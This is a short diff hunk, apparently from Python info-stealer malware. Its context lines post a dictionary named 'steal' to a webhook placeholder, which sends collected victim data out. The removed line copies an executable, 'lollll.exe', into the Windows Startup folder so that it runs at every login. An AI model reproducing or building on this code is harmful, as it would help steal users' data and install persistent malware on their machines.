@@ -229,5 +229,3 @@ steal = {
             ]
         }
 requests.post("webhooker", json=steal)
-
-os.system('copy lollll.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"')
